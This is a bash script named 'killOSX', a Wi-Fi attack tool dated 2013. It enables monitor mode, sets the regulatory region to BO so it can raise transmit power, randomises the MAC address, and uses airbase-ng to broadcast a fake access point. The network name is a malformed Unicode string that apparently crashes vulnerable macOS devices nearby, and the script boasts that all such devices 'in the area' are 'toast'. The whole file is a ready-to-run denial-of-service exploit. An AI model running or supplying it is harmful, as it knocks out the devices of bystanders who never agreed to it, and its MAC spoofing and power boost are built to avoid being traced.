#!/bin/bash

## killOSX Copyright 2013, d4rkcat (thed4rkcat@yandex.com)
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

fexit()
{
	echo
	airmon-ng stop $MON1 | grep fff
	echo $RED" [*] $MON1 has been shut down,$GRN Goodbye...$RST"
	exit
}

iw reg set BO
RED=$(echo -e "\e[1;31m")
BLU=$(echo -e "\e[1;36m")
GRN=$(echo -e "\e[1;32m")
RST=$(echo -e "\e[0;0;0m")

trap fexit 2

case $1 in
	"-i")NIC=$2;;
	"-h")echo $GRN"""killOSX$RST
Usage - killosx -i wlan0  ~  Run exploit on wlan0
        killosx -h        ~  This help";exit
esac

if [ $NIC -z ] 2> /dev/null
	then
		echo $RED""" [>] Which interface do you want to use?:
"
		WLANS="$(ifconfig | grep wlan | cut -d ' ' -f 1)"
		for WLAN in $WLANS
			do
				echo " [>] $WLAN"
			done
		echo $BLU
		read -p "  > wlan" NIC
		if [ ${NIC:0:4} = 'wlan' ] 2> /dev/null
			then
				A=1
			else
				NIC="wlan"$NIC
		fi
		echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
	else
		echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
fi

echo
echo $GRN" [*] Changing MAC and attempting to boost power on $NIC" 
ifconfig $NIC down
iwconfig $NIC txpower 30 2> /dev/null
sleep 0.5
ifconfig $NIC up
echo
ifconfig $MON1 down
macchanger -a $MON1
ifconfig $MON1 up

echo $RED"""
 [*] Setting ESSID to 'سمَـَّوُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ'
 [*] All vulnerable Osx in the area is toast.
 [>] Press Ctrl+C to exit
"$BLU
airbase-ng -e 'سمَـَّوُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ' -I 50 -i $MON1 $MON1
